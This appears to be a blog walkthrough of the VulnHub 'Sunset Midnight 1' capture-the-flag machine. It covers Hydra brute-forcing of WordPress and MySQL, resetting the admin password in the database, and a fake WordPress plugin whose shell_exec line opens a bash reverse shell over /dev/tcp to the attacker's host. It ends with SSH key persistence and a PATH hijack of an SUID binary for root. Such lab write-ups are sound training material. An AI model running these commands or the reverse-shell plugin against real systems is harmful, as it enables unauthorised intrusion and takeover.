---
title: VulnHub - Sunset Midnight 1
layout: post
date: 2020-08-15 15:00:00 +0800
---

![835b797b1e2e3a1bd8c520ebcfe40a9f.png](/images/vh-sunsetmidnight1/505b35bde6c545a9beb4812fd7d7da12.png)

### 0. Preface

This is a very straightforward machine. There is a small rabbithole right at the start with the Simply Poll plugin, though. 

In this box, we will be tackling: 

1. Weird Hydra results.
2. Resetting WordPress passwords through the database.
3. Getting a reverse shell using a WordPress "plugin".
4. Exploiting an SUID binary

<!--excerpt-->

---

### 1. Preliminary NMAP Scan
```bash
sudo nmap -sC -sV -oN nmap.txt 192.168.32.9 -v
```

![2a2b126914bf9898bdbb0227c44a1fac.png](/images/vh-sunsetmidnight1/7ddbd4d68abc4b56913ad4bc89006b15.png)

Port 80 is open, and the `robots.txt` has an entry - `/wp-admin`. This is most likely running WordPress. We also rarely see port 3306 open on a box. We definitely need to check that out as well. 

### 2. WordPress Login

Let's start with the website. 

![3f22d7d9bbd27c10eeb9c64238b12d4a.png](/images/vh-sunsetmidnight1/fe1b82c444284d7183f778148405ce15.png)

Nothing much to see here. Let's try to bruteforce `/wp-admin` with `Hydra`. 

```text
hydra -l admin -P /usr/share/wordlists/rockyou.txt sunset-midnight http-post-form "/wp-admin:log=^USER^&pwd=^PASS^&wp-submit=Log+In:The password you entered for the username"
```

![5313d3c9b89ae1fc7dcd97badd643122.png](/images/vh-sunsetmidnight1/c517988253c34d1197ec8bc7bb7a143e.png)

Interestingly, `Hydra` gives us a bunch of credentials, but none of them work. Let's move on to the SQL server on port 3306. Same thing, we are going to try to bruteforce this again with `Hydra`.

```text
hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://sunset-midnight
```

![1389fe2299e6ccfb17e77bb22111c1d3.png](/images/vh-sunsetmidnight1/c885e7a94e974af095b5d535b9e39e68.png)

We got a hit - `root:robert`. Let's login.

```mysql
mysql -u 'root' -p -h 192.168.32.9
```

![e1020cd2a9b0b516fc68d872b831ec6f.png](/images/vh-sunsetmidnight1/c59b911367e947edb5aa66434a65d846.png)

Let's do a basic enumeration of databases. 

```mysql
select * from information_schema.schemata;
```

![4685a1bab189036c2951f78537d32706.png](/images/vh-sunsetmidnight1/956e52d4e72c4b1b94e49cc52b29364b.png)

Now, let's see what's inside `wordpress_db`.

```mysql
select table_name from information_schema.tables where table_schema='wordpress_db';
```

![eab6436ee969c0af1012a144ee4da617.png](/images/vh-sunsetmidnight1/71d3ca98c90747d2a54e0658bdb3abac.png)

Alright, seems like we have a users table. Let's see if we can't find some passwords. 

```mysql
use wordpress_db;
select * from wp_users;
select user_login,user_pass from wp_users;
```

![3493869df3e4dd0c3d7e853b3d8b7a94.png](/images/vh-sunsetmidnight1/5b2471868fdc427eb4420db4c1d236da.png)

Let's try to crack the hash with `John`.

```text
sudo john --wordlist:/usr/share/wordlists/rockyou.txt wp-admin.hash
sudo john --show wp-admin.hash
```

![7227758a6091a8617214895c6275e119.png](/images/vh-sunsetmidnight1/04397dff4f2b49028fa7629a3679a676.png)

No luck here, so let's try resetting the password to `admin` in the database directly. 

```mysql
update wp_users set user_pass = md5('admin') where id=1 limit 1;
```

![d757489c783f327fc81c44efe8947b22.png](/images/vh-sunsetmidnight1/a9d4495a8547459d8765df8f98901af3.png)

Now we can try to login to `/wp-admin` with `admin:admin`. 

![11cde12aca2dcdbfa3812430c7064c43.png](/images/vh-sunsetmidnight1/570b1a22136345b986d00d06e10b9163.png)

And we're in. 

### 3. WordPress Plugin Reverse Shell 

Now that we're in, we can try to get a reverse shell going through WordPress plugins. Let's create the following PHP file as our "plugin", then zip it. 

```php 
<?php 

/**
* Plugin Name: abcdefg
* Author: hijklmnop
*/

shell_exec(bash -c 'bash -i >& /dev/tcp/192.168.32.4/8000 0>&1);
?>
```

```text
7z a rev.zip rev.php
```

![525d855bfdbb0d5105b6d21a37f64645.png](/images/vh-sunsetmidnight1/550ddba1f42146f28c82de63fde0ebea.png)

Now we can upload the plugin, setup a netcat listener on port 8000, then activate the plugin to trigger the reverse shell. 

![923b4b04b6dd336b95b0411f9a8427bb.png](/images/vh-sunsetmidnight1/1181eb0c71884d14b7c953bf79d42634.png)

![36761ae82c084da68ae3131e7e2051e1.png](/images/vh-sunsetmidnight1/d611436c962e49c3a784bf43fc6d3531.png)

### 4. Pivoting to User

Since we're logged on as `www-data`, let's take a look at `/etc/passwd` to determine who we need to pivot to. 

![3ca20eef74e04739beeaeb2902c6007f.png](/images/vh-sunsetmidnight1/2dde1be39c624d9e9ff9ab892e0f4497.png)

Let's see if we can't pivot to `jose`. We can automatically enumerate this machine with `linpeas.sh`, so let's upload and run that. 

![675782816ce7cce6bb21057143e2bac7.png](/images/vh-sunsetmidnight1/d53a258ae3014a62a4f2de206092c097.png)

We got some potential credentials in `wp-config.php` -  `jose:645dc5a8871d2a4269d4cbe23f6ae103`. Let's try to `su` to `jose` using the credentials. 

![e8707c6c288b1e62500c17e926d1807e.png](/images/vh-sunsetmidnight1/9475c81f6e0943d096181b4af4c70a2c.png)

Now we're in. Let's grab the user flag first. 

Next, for a more permanent foothold, we will generate a SSH key with `ssh-keygen`. 

![d403289a0c3d34cc18ca5d9f030f1eb9.png](/images/vh-sunsetmidnight1/0469e981f8a4420c98f3d57b2be2ee6b.png)

Now that we have generated the private and public key pair, we need to copy and paste the contents of `id_rsa.pub` into `/home/jose/.ssh/authorized_keys`. 

![8ddfaf4366820c14a1877a4809703598.png](/images/vh-sunsetmidnight1/cdfafc277ac04fd787a059fd9ea42924.png)

Let's log back into SSH using the private key. 

```
ssh jose@192.168.32.9 -i ./keys/id_rsa
```

![bdc4ed3bea1d42a0d0c75dc44775bba8.png](/images/vh-sunsetmidnight1/bf9699c4ca39458fa9c8af4bce7598f1.png)

### 5. Exploiting SUID to Root

Let's upload and run `linpeas.sh` again. 

![72fb632bf2e19d1ce97f315db27fb288.png](/images/vh-sunsetmidnight1/b2e28277abec4db88e6ba4462c7145dc.png)

In the output, we see a file, `/usr/bin/status`, which has SUID/SGID set. This file is most likely a custom binary. Running the file produces an error. 

![cb1168153b5a76b305d4cac915f691a7.png](/images/vh-sunsetmidnight1/9f4f582f41674cf6bc20f06216d7f512.png)

Let's run strings on it to roughly see what it does. 

![5e1557f429d9037db0e5eabccc049fa2.png](/images/vh-sunsetmidnight1/ac2c29e23b054433916f7b081a49e331.png)

It looks like it's trying to run the `service` binary which doesn't exist on this box. We can create our own `service` in `/home/jose` to execute `/bin/bash` as root with the follwing script.

```bash
#!/bin/bash

bash -c /bin/bash
```

For this to work, we will also need to add `/home/jose` to the `$PATH` environment variable. 

```bash
export PATH=/home/jose:$PATH
```

![f3bec1579c033784179648994857bc47.png](/images/vh-sunsetmidnight1/4469c4975f814a2d83bb648c5191011c.png)

Next, we can run `which service` to verify that the script will be run when executing `service`. 

![452fe132c91c1e83bcd46ed351b5b00b.png](/images/vh-sunsetmidnight1/89338363d7514eb493494810f3051c2c.png)

Now, let's run `/usr/bin/status` and get a root shell. 

![73553e5a23c3474c314656b984773d0f.png](/images/vh-sunsetmidnight1/7caeb656e4bd4a389cdf8ad517f14519.png)
